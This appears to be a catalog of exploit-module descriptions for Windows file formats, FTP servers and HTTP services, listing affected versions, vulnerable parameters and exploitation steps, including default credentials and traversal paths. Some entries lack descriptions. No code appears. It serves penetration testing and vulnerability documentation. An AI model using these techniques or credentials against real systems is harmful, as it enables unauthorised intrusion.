This module exploits a vulnerability in the handling of the FEATHEADER record by Microsoft Excel. Revisions of Office XP and later prior to the release of the MS09-067 bulletin are vulnerable. When processing a FEATHEADER (Shared Feature) record, Microsoft used a data structure from the file to calculate a pointer offset without doing proper validation. Attacker supplied data is then used to calculate the location of an object, and in turn a virtual function call. This results in arbitrary code execution. NOTE: On some versions of Office, the user will need to dismiss a warning dialog prior to the payload executing.

windows/fileformat/ms10_004_textbytesatom
This module exploits a stack buffer overflow vulnerability in the handling of the TextBytesAtom records by Microsoft PowerPoint Viewer. According to Microsoft, the PowerPoint Viewer distributed with Office 2003 SP3 and earlier, as well as Office 2004 for Mac, are vulnerable.

windows/fileformat/ms10_087_rtf_pfragments_bof
This module exploits a stack-based buffer overflow in the handling of the 'pFragments' shape property within the Microsoft Word RTF parser. All versions of Microsoft Office 2010, 2007, 2003, and XP prior to the release of the MS10-087 bulletin are vulnerable. This module does not attempt to exploit the vulnerability via Microsoft Outlook. The Microsoft Word RTF parser was only used by default in versions of Microsoft Word itself prior to Office 2007. With the release of Office 2007, Microsoft began using the Word RTF parser, by default, to handle rich-text messages within Outlook as well. It was possible to configure Outlook 2003 and earlier to use the Microsoft Word engine too, but it was not a default setting. It appears as though Microsoft Office 2000 is not vulnerable. It is unlikely that Microsoft will confirm or deny this since Office 2000 has reached its support cycle end-of-life.

windows/fileformat/ms11_006_createsizeddibsection
This module exploits a stack-based buffer overflow in the handling of thumbnails within .MIC files and various Office documents. When processing a thumbnail bitmap containing a negative 'biClrUsed' value, a stack-based buffer overflow occurs. This leads to arbitrary code execution. In order to trigger the vulnerable code, the folder containing the document must be viewed using the "Thumbnails" view.

windows/fileformat/ms11_021_xlb_bof
This module exploits a vulnerability found in Excel of Microsoft Office 2007. By supplying a malformed .xlb file, an attacker can control the content (source) of a memcpy routine, and the number of bytes to copy, therefore causing a stack- based buffer overflow. This results in arbitrary code execution under the context of the user.

windows/fileformat/ms12_005
This module exploits a vulnerability found in Microsoft Office's ClickOnce feature. When handling a Macro document, the application fails to recognize certain file extensions as dangerous executables, which can be used to bypass the warning message.

windows/fileformat/ms12_027_mscomctl_bof
This module exploits a stack buffer overflow in MSCOMCTL.OCX. It uses a malicious RTF to embed the specially crafted MSComctlLib.ListViewCtrl.2 Control as exploited in the wild on April 2012. This module targets Office 2007 and Office 2010 targets. The DEP/ASLR bypass on Office 2010 is done with the Ikazuchi ROP chain proposed by Abysssec. This chain uses "msgr3en.dll", which will load after office got load, so the malicious file must be loaded through "File / Open" to achieve exploitation.

windows/fileformat/ms13_071_theme
This module exploits a vulnerability mainly affecting Microsoft Windows XP and Windows 2003. The vulnerability exists in the handling of the Screen Saver path, in the [boot] section. An arbitrary path can be used as screen saver, including a remote SMB resource, which allows for remote code execution when a malicious .theme file is opened, and the "Screen Saver" tab is viewed. The code execution is also triggered if the victim installs the malicious theme and stays away from the computer, when Windows tries to display the screensaver.

windows/fileformat/ms14_017_rtf
This module creates a malicious RTF file that when opened in vulnerable versions of Microsoft Word will lead to code execution.

This module was created by reversing a public malware sample.

windows/fileformat/ms14_060_sandworm
This module exploits a vulnerability found in Windows Object Linking and Embedding (OLE) allowing arbitrary code execution, publicly known as "Sandworm". Platforms such as Windows Vista SP2 all the way to Windows 8, Windows Server 2008 and 2012 are known to be vulnerable. However, based on our testing, the most reliable setup is on Windows platforms running Office 2013 and Office 2010 SP2. And please keep in mind that some other setups such as using Office 2010 SP1 might be less stable, and sometimes may end up with a crash due to a failure in the CPackage::CreateTempFileName function. This module will generate three files: an INF, a GIF, and a PPSX file. You are required to set up a SMB or Samba 3 server and host the INF and GIF there. Systems such as Ubuntu or an older version of Windows (such as XP) work best for this because they require little configuration to get going. The PPSX file is what you should send to your target. In detail, the vulnerability has to do with how the Object Packager 2 component (packager.dll) handles an INF file that contains malicious registry changes, which may be leveraged for code execution. First of all, Packager does not load the INF file directly. As an attacker, you can trick it to load your INF anyway by embedding the file path as a remote share in an OLE object. The packager will then treat it as a type of media file, and load it with the packager!CPackage::OLE2MPlayerReadFromStream function, which will download it with a CopyFileW call, save it in a temp folder, and pass that information for later. The exploit will do this loading process twice: first for a fake gif file that's actually the payload, and the second for the INF file. The packager will also look at each OLE object's XML Presentation Command, specifically the type and cmd property. In the exploit, "verb" media command type is used, and this triggers the packager!CPackage::DoVerb function. Also, "-3" is used as the fake gif file's cmd property, and "3" is used for the INF. When the cmd is "-3", DoVerb will bail. But when "3" is used (again, for the INF file), it will cause the packager to try to find appropriate handler for it, which will end up with C:\Windows\System32\infDefaultInstall.exe, and that will install/run the malicious INF file, and finally give us arbitrary code execution.

windows/fileformat/ms14_064_packager_python
This module exploits a vulnerability found in Windows Object Linking and Embedding (OLE) allowing arbitrary code execution, bypassing the patch MS14-060, for the vulnerability publicly known as "Sandworm", on systems with Python for Windows installed. Windows Vista SP2 all the way to Windows 8, Windows Server 2008 and 2012 are known to be vulnerable. However, based on our testing, the most reliable setup is on Windows platforms running Office 2013 and Office 2010 SP2. Please keep in mind that some other setups such as those using Office 2010 SP1 may be less stable, and may end up with a crash due to a failure in the CPackage::CreateTempFileName function.

windows/fileformat/mswin_tiff_overflow
This module exploits a vulnerability found in Microsoft's Tagged Image File Format. It was originally discovered in the wild, targeting Windows XP and Windows Server 2003 users running Microsoft Office, specifically in the Middle East and South Asia region. The flaw is due to a DWORD value extracted from the TIFF file that is embedded as a drawing in Microsoft Office, and how it gets calculated with user-controlled inputs, and stored in the EAX register. The 32-bit register will run out of storage space to represent the large value, which ends up being 0, but it still gets pushed as a dwBytes argument (size) for a HeapAlloc call. The HeapAlloc function will allocate a chunk anyway with size 0, and the address of this chunk is used as the destination buffer of a memcpy function, where the source buffer is the EXIF data (an extended image format supported by TIFF), and is also user-controlled. A function pointer in the chunk returned by HeapAlloc will end up being overwritten by the memcpy function, and then later used in OGL!GdipCreatePath. By successfully controlling this function pointer, and the memory layout using ActiveX, it is possible to gain arbitrary code execution under the context of the user.

windows/fileformat/msworks_wkspictureinterface

windows/fileformat/visiwave_vwr_type
This module exploits a vulnerability found in VisiWave's Site Survey Report application. When processing .VWR files, VisiWaveReport.exe attempts to match a valid pointer based on the 'Type' property (valid ones include 'Properties', 'TitlePage', 'Details', 'Graph', 'Table', 'Text', 'Image'), but if a match isn't found, the function that's supposed to handle this routine ends up returning the input as a pointer, and later used in a CALL DWORD PTR [EDX+10] instruction. This allows attackers to overwrite it with any arbitrary value, and results code execution. A patch is available at visiwave.com; the fix is done by XORing the return value as null if no match is found, and then it is validated before use. NOTE: During installation, the application will register two file handles, VWS and VWR, which allows a victim user to 'double click' the malicious VWR file and execute code. This module was also built to bypass ASLR and DEP.

windows/ftp/sami_ftpd_list
This module exploits a stack based buffer overflow on Sami FTP Server 2.0.1. The vulnerability exists in the processing of LIST commands. In order to trigger the vulnerability, the "Log" tab must be viewed in the Sami FTP Server managing application, in the target machine. On the other hand, the source IP address used to connect with the FTP Server is needed. If the user can't provide it, the module will try to resolve it. This module has been tested successfully on Sami FTP Server 2.0.1 over Windows XP SP3.

windows/ftp/sami_ftpd_user
This module exploits an unauthenticated stack buffer overflow in KarjaSoft Sami FTP Server version 2.0.2 by sending an overly long USER string during login. The payload is triggered when the administrator opens the application GUI. If the GUI window is open at the time of exploitation, the payload will be executed immediately. Keep this in mind when selecting payloads. The application will crash following execution of the payload and will not restart automatically. When the application is restarted, it will re-execute the payload unless the payload has been manually removed from the SamiFTP.binlog log file. This module has been tested successfully on Sami FTP Server versions: 2.0.2 on Windows XP SP0 (x86); 2.0.2 on Windows 7 SP1 (x86); 2.0.2 on Windows 7 SP1 (x64); and 2.0.2 on Windows 10 (1909) (x64).

windows/ftp/sasser_ftpd_port
This module exploits the FTP server component of the Sasser worm. By sending an overly long PORT command the stack can be overwritten.

windows/ftp/scriptftp_list
AmmSoft's ScriptFTP client is susceptible to a remote buffer overflow vulnerability that is triggered when processing a sufficiently long filename during a FTP LIST command resulting in overwriting the exception handler. Social engineering of executing a specially crafted ftp file by double click will result in connecting to our malicious server and perform arbitrary code execution which allows the attacker to gain the same rights as the user running ScriptFTP. This vulnerability affects versions 3.3 and earlier.

windows/ftp/seagull_list_reply
This module exploits a buffer overflow in the Seagull FTP client that gets triggered when the ftp client processes a response to a LIST command. If the response contains an overly long file/folder name, a buffer overflow occurs, overwriting a structured exception handler.

windows/ftp/servu_chmod
This module exploits a stack buffer overflow in the site chmod command in versions of Serv-U FTP Server prior to 4.2. You must have valid credentials to trigger this vulnerability. Exploitation also leaves the service in a non-functional state.

windows/ftp/servu_mdtm
This is an exploit for the Serv-U\'s MDTM command timezone overflow. It has been heavily tested against versions 4.0.0.4/4.1.0.0/4.1.0.3/5.0.0.0 with success against nt4/2k/xp/2k3. I have also had success against version 3, but only tested 1 version/os. The bug is in all versions prior to 5.0.0.4, but this exploit will not work against versions not listed above. You only get one shot, but it should be OS/SP independent. This exploit is a single hit, the service dies after the shellcode finishes execution.

windows/ftp/slimftpd_list_concat
This module exploits a stack buffer overflow in the SlimFTPd server. The flaw is triggered when a LIST command is received with an overly-long argument. This vulnerability affects all versions of SlimFTPd prior to 3.16 and was discovered by Raphael Rigo.

This module exploits a buffer overflow in the Trellian 3.01 FTP client that is triggered through an excessively long PASV message.

windows/ftp/turboftp_port
This module exploits a buffer overflow vulnerability found in the PORT command in Turbo FTP Server 1.30.823 & 1.30.826, which results in remote code execution under the context of SYSTEM.

windows/ftp/vermillion_ftpd_port
This module exploits an out-of-bounds array access in the Arcane Software Vermillion FTP server. By sending a specially crafted FTP PORT command, an attacker can corrupt stack memory and execute arbitrary code. This particular issue is caused by processing data bound by attacker controlled input while writing into a 4 byte stack buffer. Unfortunately, the writing that occurs is not a simple byte copy. Processing is done using a source ptr (p) and a destination pointer (q). The vulnerable function walks the input string and continues while the source byte is non-null. If a comma is encountered, the function increments the destination pointer. If an ascii digit [0-9] is encountered, the following occurs: *q = (*q * 10) + (*p - '0'); All other input characters are ignored in this loop. As a consequence, an attacker must craft input such that modifications to the current values on the stack result in usable values. In this exploit, the low two bytes of the return address are adjusted to point at the location of a 'call edi' instruction within the binary. This was chosen since 'edi' points at the source buffer when the function returns. NOTE: This server can be installed as a service using "vftpd.exe install". If so, the service does not restart automatically, giving an attacker only one attempt.

windows/ftp/warftpd_165_pass
This exploits the buffer overflow found in the PASS command in War-FTPD 1.65. This particular module will only work reliably against Windows 2000 targets. The server must be configured to allow anonymous logins for this exploit to succeed. A failed attempt will bring down the service completely.

windows/ftp/warftpd_165_user
This module exploits a buffer overflow found in the USER command of War-FTPD 1.65.

windows/ftp/wftpd_size

windows/games/ut2004_secure
This is an exploit for the GameSpy secure query in the Unreal Engine. This exploit only requires one UDP packet, which can be both spoofed and sent to a broadcast address. Usually, the GameSpy query server listens on port 7787, but you can manually specify the port as well. The RunServer.sh script will automatically restart the server upon a crash, giving us the ability to bruteforce the service and exploit it multiple times.

windows/http/adobe_robohelper_authbypass
This module exploits an authentication bypass vulnerability which allows remote attackers to upload and execute arbitrary code.

windows/http/advantech_iview_networkservlet_cmd_inject
Versions of Advantech iView software below `5.7.04.6469` are vulnerable to an unauthenticated command injection vulnerability via the `NetworkServlet` endpoint. The database backup functionality passes a user-controlled parameter, `backup_file` to the `mysqldump` command. The sanitization functionality only tests for SQL injection attempts and directory traversal, so leveraging the `-r` and `-w` `mysqldump` flags permits exploitation. The command injection vulnerability is used to write a payload on the target and achieve remote code execution as NT AUTHORITY\SYSTEM.

windows/http/advantech_iview_unauth_rce
This module exploits an unauthenticated configuration change combined with an unauthenticated file write primitive, leading to an arbitrary file write that allows for remote code execution as the user running iView, which is typically NT AUTHORITY\SYSTEM. This issue was demonstrated in the vulnerable version 5.7.02.5992 and fixed in version 5.7.03.6112.

windows/http/altn_securitygateway
Alt-N SecurityGateway is prone to a buffer overflow condition. This is due to insufficient bounds checking on the "username" parameter. Successful exploitation could result in code execution with SYSTEM level privileges. NOTE: This service doesn't restart, you'll only get one shot. However, it often survives a successful exploitation attempt.

windows/http/altn_webadmin
Alt-N WebAdmin is prone to a buffer overflow condition. This is due to insufficient bounds checking on the USER parameter. Successful exploitation could result in code execution with SYSTEM level privileges.

windows/http/amlibweb_webquerydll_app

By specifying an overly long string to the 'app' parameter, SeH can be reliably overwritten allowing for arbitrary remote code execution. In addition, it is possible to overwrite EIP by specifying an arbitrary parameter name with an '=' terminator.

windows/http/apache_activemq_traversal_upload
This module exploits a directory traversal vulnerability (CVE-2015-1830) in Apache ActiveMQ 5.x before 5.11.2 for Windows. The module tries to upload a JSP payload to the /admin directory via the traversal path /fileserver/..\admin\ using an HTTP PUT request with the default ActiveMQ credentials admin:admin (or other credentials provided by the user). It then issues an HTTP GET request to /admin/<payload>.jsp on the target in order to trigger the payload and obtain a shell.

windows/http/apache_chunked
This module exploits the chunked transfer integer wrap vulnerability in Apache version 1.2.x to 1.3.24. This particular module has been tested with all versions of the official Win32 build between 1.3.9 and 1.3.24. Additionally, it should work against most co-branded and bundled versions of Apache (Oracle 8i, 9i, IBM HTTPD, etc). You will need to use the Check() functionality to determine the exact target version prior to launching the exploit. The version of Apache bundled with Oracle 8.1.7 will not automatically restart, so if you use the wrong target value, the server will crash.

windows/http/apache_mod_rewrite_ldap
This module exploits the mod_rewrite LDAP protocol scheme handling flaw discovered by Mark Dowd, which produces an off-by-one overflow. Apache versions 1.3.29-36, 2.0.47-58, and 2.2.1-2 are vulnerable. This module requires REWRITEPATH to be set accurately. In addition, the target must have 'RewriteEngine on' configured, with a specific 'RewriteRule' condition enabled to allow for exploitation. The flaw affects multiple platforms, however this module currently only supports Windows based installations.

windows/http/apache_modjk_overflow
This is a stack buffer overflow exploit for mod_jk 1.2.20. Should work on any Win32 OS.

windows/http/apache_tika_jp2_jscript
This module exploits a command injection vulnerability in Apache Tika 1.15 - 1.17 on Windows. A file with the image/jp2 content-type is used to bypass magic bytes checking. When OCR is specified in the request, parameters can be passed to change the parameters passed at command line to allow for arbitrary JScript to execute. A JScript stub is passed to execute arbitrary code. This module was verified against version 1.15 - 1.17 on Windows 2012. While the CVE and finding show more versions vulnerable, during testing it was determined only > 1.14 was exploitable due to jp2 support being added.

windows/http/avaya_ccr_imageupload_exec
This module exploits an authentication bypass vulnerability on Avaya IP Office Customer Call Reporter, which allows a remote user to upload arbitrary files through the ImageUpload.ashx component. It can be abused to upload and execute arbitrary ASP .NET code. The vulnerability has been tested successfully on Avaya IP Office Customer Call Reporter 7.0.4.2 and 8.0.8.15 on Windows 2003 SP2.

windows/http/cayin_xpost_sql_rce
This module exploits an unauthenticated SQLi in Cayin xPost <=2.5. The wayfinder_meeting_input.jsp file's wayfinder_seqid parameter can be injected with a blind SQLi. Since this app bundles MySQL and apache Tomcat the environment is pretty static and therefore the default settings should work. Results in SYSTEM level access. Only the java/jsp_shell_reverse_tcp and java/jsp_shell_bind_tcp payloads seem to be valid.

windows/http/cogent_datahub_command
This module exploits an injection vulnerability in Cogent DataHub prior to 7.3.5. The vulnerability exists in the GetPermissions.asp page, which makes insecure use of the datahub_command function with user controlled data, allowing execution of arbitrary datahub commands and scripts.

windows/http/exchange_ecp_dlp_policy
This vulnerability allows remote attackers to execute arbitrary code on affected installations of Exchange Server. Authentication is required to exploit this vulnerability. Additionally, the target user must have the "Data Loss Prevention" role assigned and an active mailbox. If the user is in the "Compliance Management" or greater "Organization Management" role groups, then they have the "Data Loss Prevention" role. Since the user who installed Exchange is in the "Organization Management" role group, they transitively have the "Data Loss Prevention" role. The specific flaw exists within the processing of the New-DlpPolicy cmdlet. The issue results from the lack of proper validation of user-supplied template data when creating a DLP policy. An attacker can leverage this vulnerability to execute code in the context of SYSTEM. Tested against Exchange Server 2016 CU19 on Windows Server 2016.

windows/http/exchange_ecp_viewstate
This module exploits a .NET serialization vulnerability in the Exchange Control Panel (ECP) web page. The vulnerability is due to Microsoft Exchange Server not randomizing the keys on a per-installation basis resulting in them using the same validationKey and decryptionKey values. With knowledge of these values, an attacker can craft a special ViewState to cause an OS command to be executed by NT_AUTHORITY\SYSTEM using .NET deserialization.

windows/http/exchange_proxylogon_rce

windows/http/flexdotnetcms_upload_exec
This module exploits an arbitrary file upload vulnerability in FlexDotnetCMS v1.5.8 and prior in order to execute arbitrary commands with elevated privileges. The module first tries to authenticate to FlexDotnetCMS via an HTTP POST request to `/login`. It then attempts to upload a random TXT file and subsequently uses the FlexDotnetCMS file editor to rename the TXT file to an ASP file. If this succeeds, the target is vulnerable and the ASP file is generated as a copy of the TXT file, which remains on the server. Next, the module sends another request to rename the TXT file to an ASP file, this time adding the payload. Finally, the module tries to execute the ASP payload via a simple HTTP GET request to `/media/uploads/asp_payload` Valid credentials for a FlexDotnetCMS user with permissions to use the FileManager are required. This module has been successfully tested against FlexDotnetCMS v1.5.8 running on Windows Server 2012.

windows/http/hp_loadrunner_copyfiletoserver
This module exploits a directory traversal vulnerability in version 11.52 of HP LoadRunner. The vulnerability exists in the EmulationAdmin web service, specifically in the copyFileToServer method, allowing the upload of arbitrary files. This module has been tested successfully on HP LoadRunner 11.52 on Windows 2003 SP2.

windows/http/hp_mpa_job_acct
This module exploits an arbitrary file upload vulnerability on HP Managed Printing Administration 2.6.3 and prior versions. The vulnerability exists in the UploadFiles() function from the MPAUploader.Uploader.1 control, loaded and used by the server. The function can be abused via directory traversal and null byte injection in order to achieve arbitrary file upload. In order to exploit successfully, a few conditions must be met. First, a writable location under the context of Internet Guest Account (IUSR_*) or Everyone is required. By default, this module will attempt to write to /hpmpa/userfiles/, but the WRITEWEBFOLDER option can be used to provide another writable path. Second, the writable path must also be readable by a browser, so this typically means a location under wwwroot. Finally, you cannot overwrite a file with the same name as the payload.

windows/http/hp_nnm_getnnmdata_hostname
This module exploits a buffer overflow in HP OpenView Network Node Manager 7.50/7.53. By sending specially crafted Hostname parameter to the getnnmdata.exe CGI, an attacker may be able to execute arbitrary code.

windows/http/hp_nnm_getnnmdata_icount
This module exploits a buffer overflow in HP OpenView Network Node Manager 7.50/7.53. By sending specially crafted ICount parameter to the getnnmdata.exe CGI, an attacker may be able to execute arbitrary code.

windows/http/hp_nnm_nnmrptconfig_nameparams
This module exploits a vulnerability in HP NNM's nnmRptConfig.exe. A remote user can send a long string data to the nameParams parameter via a POST request, which causes an overflow on the stack when function ov.sprintf_new() is used, and gain arbitrary code execution.'

windows/http/hp_nnm_nnmrptconfig_schdparams
This module exploits NNM's nnmRptConfig.exe. Similar to other NNM CGI bugs, the overflow occurs during a ov.sprintf_new() call, which allows an attacker to overwrite data on the stack, and gain arbitrary code execution.

windows/http/hp_nnm_openview5
This module exploits a stack buffer overflow in HP OpenView Network Node Manager 7.50. By sending a specially crafted CGI request, an attacker may be able to execute arbitrary code.

windows/http/hp_nnm_ovalarm_lang
This module exploits a stack buffer overflow in HP OpenView Network Node Manager 7.53. By sending a specially crafted CGI request to ovalarm.exe, an attacker can execute arbitrary code. This specific vulnerability is due to a call to "sprintf_new" in the "isWide" function within "ovalarm.exe". A stack buffer overflow occurs when processing an HTTP request that contains the following. 1. An "Accept-Language" header longer than 100 bytes 2. An "OVABverbose" URI variable set to "on", "true" or "1" The vulnerability is related to "_WebSession::GetWebLocale()". NOTE: This exploit has been tested successfully with a reverse_ord_tcp payload.

windows/http/hp_nnm_ovas
This module exploits a stack buffer overflow in HP OpenView Network Node Manager versions 7.53 and earlier. Specifically this vulnerability is caused by a failure to properly handle user supplied input within the HTTP request including headers and the actual URL GET request. Exploitation is tricky due to character restrictions. It was necessary to utilize a egghunter shellcode which was alphanumeric encoded by muts in the original exploit. If you plan on using exploit this for a remote shell, you will likely want to migrate to a different process as soon as possible. Any connections get reset after a short period of time. This is probably some timeout handling code that causes this.

windows/http/hp_nnm_ovbuildpath_textfile
This module exploits a stack buffer overflow in HP OpenView Network Node Manager 7.53 prior to NNM_01213 without the SSRT100649 hotfix. By specifying a long 'textFile' argument when calling the 'webappmon.exe' CGI program, an attacker can cause a stack-based buffer overflow and execute arbitrary code. The vulnerable code is within the "_OVBuildPath" function within "ov.dll". There are no stack cookies, so exploitation is achieved by overwriting the saved return address. The vulnerability is due to the use of the function "_OVConcatPath" which finally uses "strcat" in an insecure way. User controlled data is concatenated to a string which contains the OpenView installation path. To achieve reliable exploitation a directory traversal in OpenView5.exe (OSVDB 44359) is being used to retrieve OpenView logs and disclose the installation path. If the installation path cannot be guessed the default installation path is used.

windows/http/hp_nnm_ovwebhelp
This module exploits a stack buffer overflow in HP OpenView Network Node Manager 7.50. By sending a specially crafted CGI request to OvWebHelp.exe, an attacker may be able to execute arbitrary code.

windows/http/hp_nnm_ovwebsnmpsrv_main
This module exploits a stack buffer overflow in HP OpenView Network Node Manager 7.53 prior to NNM_01203. By specifying a long 'arg' parameter when executing the 'jovgraph.exe' CGI program, an attacker can cause a stack-based buffer overflow and execute arbitrary code. This vulnerability is triggerable via either a GET or POST request. The buffer being written to is 1024 bytes in size. It is important to note that this vulnerability must be exploited by overwriting SEH. Otherwise, CVE-2010-1961 is triggered! The vulnerable code is within the "main" function within "ovwebsnmpsrv.exe" with a timestamp prior to April 7th, 2010. There are no stack cookies, so exploitation is easily achieved by overwriting SEH structures. There exists some unreliability when running this exploit. It is not completely clear why at this time, but may be related to OVWDB or session management. Also, on some attempts OV NNM may report invalid characters in the URL. It is not clear what is causing this either.

windows/http/hp_nnm_ovwebsnmpsrv_ovutil
This module exploits a stack buffer overflow in HP OpenView Network Node Manager 7.53 prior to NNM_01203. By specifying a long 'arg' parameter when executing the 'jovgraph.exe' CGI program, an attacker can cause a stack-based buffer overflow and execute arbitrary code. This vulnerability is triggerable via either a GET or POST request. It is interesting to note that this vulnerability cannot be exploited by overwriting SEH, since attempting to would trigger CVE-2010-1964. The vulnerable code is within a sub-function called from "main" within "ovwebsnmpsrv.exe" with a timestamp prior to April 7th, 2010. This function contains a 256 byte stack buffer which is passed to the "getProxiedStorageAddress" function within ovutil.dll. When processing the address results in an error, the buffer is overflowed in a call to sprintf_new. There are no stack cookies present, so exploitation is easily achieved by overwriting the saved return address. There exists some unreliability when running this exploit. It is not completely clear why at this time, but may be related to OVWDB or session management. Also, on some attempts OV NNM may report invalid characters in the URL. It is not clear what is causing this either.

windows/http/hp_nnm_ovwebsnmpsrv_uro
This module exploits a stack buffer overflow in HP OpenView Network Node Manager 7.53 prior to NNM_01203. By specifying a long 'arg' parameter when executing the 'jovgraph.exe' CGI program, an attacker can cause a stack-based buffer overflow and execute arbitrary code. The vulnerable code is within the option parsing function within "ovwebsnmpsrv.exe" with a timestamp prior to April 7th, 2010. Reaching the vulnerable code requires a 'POST' request with an 'arg' parameter that, when combined with some static text, exceeds 10240 bytes. The parameter must begin with a dash. It is important to note that this vulnerability must be exploited by overwriting SEH. This is since overflowing the buffer with controllable data always triggers an access violation when attempting to write static text beyond the end of the stack. Exploiting this issue is a bit tricky due to a restrictive character set. In order to accomplish arbitrary code execution, a double-backward jump is used in combination with the Alpha2 encoder.

windows/http/hp_nnm_snmp
This module exploits a stack buffer overflow in HP OpenView Network Node Manager 7.50. By sending a specially crafted CGI request to Snmp.exe, an attacker may be able to execute arbitrary code.

This module exploits a stack buffer overflow in HP OpenView Network Node Manager 7.53 prior to NNM_01203. By making a specially crafted HTTP request to the "snmpviewer.exe" CGI program, an attacker can cause a stack-based buffer overflow and execute arbitrary code. The vulnerable code lies within a function within "snmpviewer.exe" with a timestamp prior to April 7th, 2010. This vulnerability is triggerable via either a GET or POST request. The request must contain 'act' and 'app' parameters which, when combined, total more than the 1024 byte stack buffer can hold. It is important to note that this vulnerability must be exploited by overwriting SEH. While the saved return address can be smashed, a function call that occurs before the function returns calls "exit".

windows/http/hp_nnm_toolbar_01
This module exploits a stack buffer overflow in HP OpenView Network Node Manager 7.50. By sending a specially crafted CGI request to Toolbar.exe, an attacker may be able to execute arbitrary code.

windows/http/hp_nnm_toolbar_02
This module exploits a stack buffer overflow in HP OpenView Network Node Manager 7.0 and 7.53. By sending a CGI request with a specially OvOSLocale cookie to Toolbar.exe, an attacker may be able to execute arbitrary code. Please note that this module only works against a specific build (i.e. NNM 7.53_01195)

windows/http/hp_nnm_webappmon_execvp
This module exploits a stack buffer overflow in HP OpenView Network Node Manager 7.53 prior to NNM_01207 or NNM_01206 without the SSRT100025 hotfix. By specifying a long 'sel' parameter when calling methods within the 'webappmon.exe' CGI program, an attacker can cause a stack-based buffer overflow and execute arbitrary code. This vulnerability is not triggerable via a GET request due to limitations on the request size. The buffer being targeted is 16384 bytes in size. There are actually two adjacent buffers that both get overflowed (one into the other), and strcat is used. The vulnerable code is within the "execvp_nc" function within "ov.dll" prior to v 1.30.12.69. There are no stack cookies, so exploitation is easily achieved by overwriting the saved return address or SEH frame. This vulnerability might also be triggerable via other CGI programs, however this was not fully investigated.

windows/http/hp_nnm_webappmon_ovjavalocale
This module exploits a stack buffer overflow in HP OpenView Network Node Manager 7.53. By sending a request containing a cookie longer than 5120 bytes, an attacker can overflow a stack buffer and execute arbitrary code. The vulnerable code is within the OvWwwDebug function. The static-sized stack buffer is declared within this function. When the vulnerability is triggered, the stack trace looks like the following: #0 ... #1 sprintf_new(local_stack_buf, fmt, cookie); #2 OvWwwDebug(" HTTP_COOKIE=%s\n", cookie); #3 ?OvWwwInit@@YAXAAHQAPADPBD@Z(x, x, x); #4 sub_405ee0("nnm", "webappmon"); No validation is done on the cookie argument. There are no stack cookies, so exploitation is easily achieved by overwriting the saved return address or SEH frame. The original advisory detailed an attack vector using the "OvJavaLocale" cookie being passed in a request to "webappmon.exe". Further research shows that several different cookie values, as well as several different CGI applications, can be used. '

windows/http/hp_openview_insight_backdoor

The module has been tested successfully on HP SiteScope 11.20 (with HP Operations Agent) over Windows 2003 SP2.

windows/http/hpe_sim_76_amf_deserialization
A remotely exploitable vulnerability exists within HPE System Insight Manager (SIM) version 7.6.x that can be leveraged by a remote unauthenticated attacker to execute code within the context of HPE System Insight Manager's hpsimsvc.exe process, which runs with administrative privileges. The vulnerability occurs due to a failure to validate data during the deserialization process when a user submits a POST request to the /simsearch/messagebroker/amfsecure page. This module exploits this vulnerability by leveraging an outdated copy of Commons Collection, namely 3.2.2, that ships with HPE SIM, to gain RCE as the administrative user running HPE SIM.

windows/http/httpdx_handlepeer
This module exploits a stack-based buffer overflow vulnerability in HTTPDX HTTP server 1.4. The vulnerability is caused due to a boundary error within the "h_handlepeer()" function in http.cpp. By sending an overly long HTTP request, an attacker can overrun a buffer and execute arbitrary code.

windows/http/httpdx_tolog_format
This module exploits a format string vulnerability in HTTPDX HTTP server. By sending a specially crafted HTTP request containing format specifiers, an attacker can corrupt memory and execute arbitrary code. By default logging is off for HTTP, but enabled for the 'moderator' user via FTP.

windows/http/ia_webmail
This exploits a stack buffer overflow in the IA WebMail server. This exploit has not been tested against a live system at this time.

windows/http/ibm_tivoli_endpoint_bof
This module exploits a stack based buffer overflow in the way IBM Tivoli Endpoint Manager versions 3.7.1, 4.1, 4.1.1, 4.3.1 handles long POST query arguments. This issue can be triggered by sending a specially crafted HTTP POST request to the service (lcfd.exe) listening on TCP port 9495. To trigger this issue authorization is required. This exploit makes use of a second vulnerability, a hardcoded account (tivoli/boss) is used to bypass the authorization restriction.

windows/http/ibm_tpmfosd_overflow

This module exploits a stack buffer overflow in the IBM Tivoli Storage Manager Express CAD Service (5.3.3). By sending an overly long GET request, it may be possible for an attacker to execute arbitrary code.

windows/http/icecast_header
This module exploits a buffer overflow in the header parsing of icecast versions 2.0.1 and earlier, discovered by Luigi Auriemma. Sending 32 HTTP headers will cause a write one past the end of a pointer array. On win32 this happens to overwrite the saved instruction pointer, and on linux (depending on compiler, etc) this seems to generally overwrite nothing crucial (read not exploitable). This exploit uses ExitThread(), this will leave icecast thinking the thread is still in use, and the thread counter won't be decremented. This means for each time your payload exits, the counter will be left incremented, and eventually the threadpool limit will be maxed. So you can multihit, but only till you fill the threadpool.

windows/http/integard_password_bof
This module exploits a stack buffer overflow in Race river's Integard Home/Pro internet content filter HTTP Server. Versions prior to 2.0.0.9037 and 2.2.0.9037 are vulnerable. The administration web page on port 18881 is vulnerable to a remote buffer overflow attack. By sending a long character string in the password field, both the structured exception handler and the saved extended instruction pointer are over written, allowing an attacker to gain control of the application and the underlying operating system remotely. The administration website service runs with SYSTEM privileges, and automatically restarts when it crashes.

windows/http/intersystems_cache

windows/http/manage_engine_opmanager_rce
This module exploits a default credential vulnerability in ManageEngine OpManager, where a default hidden account "IntegrationUser" with administrator privileges exists. The account has a default password of "plugin" which cannot be reset through the user interface. By log-in and abusing the default administrator's SQL query functionality, it's possible to write a WAR payload to disk and trigger an automatic deployment of this payload. This module has been tested successfully on OpManager v11.0 and v11.4-v11.6 for Windows.

windows/http/manageengine_adaudit_plus_authenticated_rce
This module exploits security issues in ManageEngine ADAudit Plus prior to 7006 that allow authenticated users to execute arbitrary code by creating a custom alert profile and leveraging its custom alert script component. The module first runs a few checks to test the provided credentials, retrieve the configured domain(s) and obtain the build number of the target ADAudit Plus server. If the credentials are valid and the target is vulnerable, the module creates an alert profile that will be triggered for any failed login attempt to the configured domain. For versions prior to build 7004, the payload is directly inserted in the custom alert script component of the alert profile. For versions 7004 and 7005, the module leverages an arbitrary file write vulnerability (CVE-2021-42847) to create a Powershell script in the alert_scripts directory that contains the payload. The name of this script is then provided as the value for the custom alert script component of the alert profile. This module requires valid credentials for an account with the privileges to create alert scripts. It has been successfully tested against ManageEngine ADAudit Plus builds 7003 and 7005 running on Windows Server 2012 R2. Successful exploitation will result in RCE as the user running ManageEngine ADAudit Plus, which will typically be the local administrator.

windows/http/manageengine_adaudit_plus_cve_2022_28219
